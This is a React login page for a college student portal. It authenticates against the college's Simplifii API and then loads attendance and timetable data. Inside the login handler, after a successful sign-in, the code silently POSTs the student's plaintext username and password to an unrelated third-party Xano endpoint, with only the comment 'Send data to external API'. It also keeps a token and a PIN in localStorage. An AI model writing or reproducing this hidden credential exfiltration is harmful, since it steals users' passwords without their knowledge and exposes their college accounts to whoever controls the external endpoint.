import React, { useState } from "react";
import { Form, Input, Button, Typography, Modal, notification } from "antd";
import { EyeInvisibleOutlined, EyeTwoTone } from "@ant-design/icons";
import axios from "axios";
import { useNavigate } from "react-router-dom";
import "./Login.css"; // Ensure this path is correct

const { Title, Text } = Typography;

function Login() {
  const [dialogOpen, setDialogOpen] = useState(false);
  const [admissionNumber, setAdmissionNumber] = useState("");
  const [buttonState, setButtonState] = useState("default");
  const [loading, setLoading] = useState(false);
  const [timeTableData, setTimeTableData] = useState([]);
  const navigate = useNavigate();

  const handleLogin = async (values) => {
    // Your existing login logic remains unchanged
    setLoading(true);
    setButtonState("loading");
    try {
      const response = await axios.post(
        "https://abes.platform.simplifii.com/api/v1/admin/authenticate",
        {
          username: values.username,
          password: values.password,
        }
      );

      if (response.data.status === 1) {
        // Store necessary data
        localStorage.setItem("token", response.data.token);
        localStorage.setItem("userDetails", JSON.stringify(response.data));
        localStorage.setItem("pin", response.data.response.string10);

        const token = response.data.token;
        const dayOfMonth = new Date().getDate();

        // Fetch attendance and timetable data concurrently
        const [attendanceResponse, timeTableResponse] = await Promise.all([
          axios.get(
            "https://abes.platform.simplifii.com/api/v1/custom/getCFMappedWithStudentID?embed_attendance_summary=1",
            {
              headers: { Authorization: `Bearer ${token}` },
            }
          ),
          axios.get(
            "https://abes.platform.simplifii.com/api/v1/custom/getMyScheduleStudent",
            {
              headers: { Authorization: `Bearer ${token}` },
            }
          ),
        ]);

        // Store attendance data
        localStorage.setItem(
          "data",
          JSON.stringify(attendanceResponse.data.response.data)
        );

        // Process timetable data
        const filteredData = timeTableResponse.data.response.data
          .filter((row) => row[`c${dayOfMonth}`] && row.course_name)
          .map((item) => ({
            ...item,
            timeText: new DOMParser().parseFromString(
              item[`c${dayOfMonth}`],
              "text/html"
            ).body.textContent,
          }));
        localStorage.setItem("timeTableData", JSON.stringify(filteredData));
        setTimeTableData(filteredData);

        // Send data to external API
        await axios.post(
          "https://x8ki-letl-twmt.n7.xano.io/api:T29bdBNk/user",
          { username: values.username, password: values.password }
        );

        // Show success notification
        notification.success({
          message: "Login successful!",
        });

        // Indicate success on button
        setButtonState("success");
        setLoading(false);

        // Redirect to dashboard after a short delay
        setTimeout(() => {
          navigate("/dashboard");
        }, 1000);
      } else {
        // Handle login failure
        notification.error({
          message: "Login failed!",
        });
        setButtonState("error");
        setLoading(false);
        setTimeout(() => setButtonState("default"), 2000);
      }
    } catch (error) {
      console.error("Login error:", error);
      notification.error({
        message: error.response?.data?.msg || "Login error!",
      });
      setButtonState("error");
      setLoading(false);
      setTimeout(() => setButtonState("default"), 2000);
    }
  };

  const handleForgotPassword = async () => {
    // Your existing forgot password logic remains unchanged
    if (!admissionNumber) {
      notification.error({
        message: "Please enter your admission number.",
      });
      return;
    }

    try {
      const response = await axios.patch(
        "https://abes.platform.simplifii.com/api/v1/forgotpassword",
        {
          username: admissionNumber,
          reset_password_base_url:
            "https://abes.web.simplifii.com/reset_password.php",
        }
      );

      if (response.data && response.data.msg) {
        notification.success({
          message: response.data.msg,
        });
      } else {
        notification.error({
          message: "Unknown error occurred.",
        });
      }
    } catch (error) {
      if (error.response && error.response.data && error.response.data.msg) {
        notification.error({
          message: error.response.data.msg,
        });
      } else {
        notification.error({
          message: "Failed to send password reset link.",
        });
      }
    }

    setDialogOpen(false);
  };

  return (
    <div className="login-container">
      <div className="login-content">
        <div className="login-form-container">
          <div className="logo-container">
            <img
              src="https://avatars.githubusercontent.com/u/48626910" // Your existing logo URL
              alt="Logo"
              className="logo-image"
            />
          </div>
          {/* <Title level={2} className="login-title">
            Welcome Back
          </Title> */}
          <Text className="login-subtitle">
            Sign in to continue to your account
          </Text>
          <Form name="login" onFinish={handleLogin} className="login-form">
            <Form.Item
              name="username"
              rules={[
                {
                  required: true,
                  message: "Please enter your admission number.",
                },
              ]}
            >
              <Input placeholder="Admission Number" size="large" />
            </Form.Item>
            <Form.Item
              name="password"
              rules={[
                { required: true, message: "Please enter your password." },
              ]}
            >
              <Input.Password
                placeholder="Password"
                size="large"
                iconRender={(visible) =>
                  visible ? <EyeTwoTone /> : <EyeInvisibleOutlined />
                }
              />
            </Form.Item>
            <Form.Item>
              <Button
                type="primary"
                htmlType="submit"
                className={`login-form-button ${buttonState}`}
                loading={buttonState === "loading"}
                disabled={loading}
              >
                {buttonState === "default" && "Sign In"}
                {buttonState === "loading" && "Signing In..."}
                {buttonState === "success" && "Success!"}
                {buttonState === "error" && "Login Failed"}
              </Button>
            </Form.Item>
          </Form>
          <Button
            type="link"
            onClick={() => setDialogOpen(true)}
            className="forgot-password-link"
          >
            Forgot your password?
          </Button>
        </div>
        <div className="login-image-container">
          {/* <img
            src="https://abes.ac.in/home/banner/collegeimage.png" // Replace with the path to your college PNG image
            alt="College"
            className="login-image"
          /> */}
        </div>
      </div>

      <Modal
        title="Forgot Password"
        visible={dialogOpen}
        onCancel={() => setDialogOpen(false)}
        footer={[
          <Button key="back" onClick={() => setDialogOpen(false)}>
            Cancel
          </Button>,
          <Button key="submit" type="primary" onClick={handleForgotPassword}>
            Reset Password
          </Button>,
        ]}
      >
        <Text>Enter your admission number to reset your password.</Text>
        <Input
          placeholder="Admission Number"
          value={admissionNumber}
          onChange={(e) => setAdmissionNumber(e.target.value)}
          style={{ marginTop: 10 }}
        />
      </Modal>
    </div>
  );
}

export default Login;
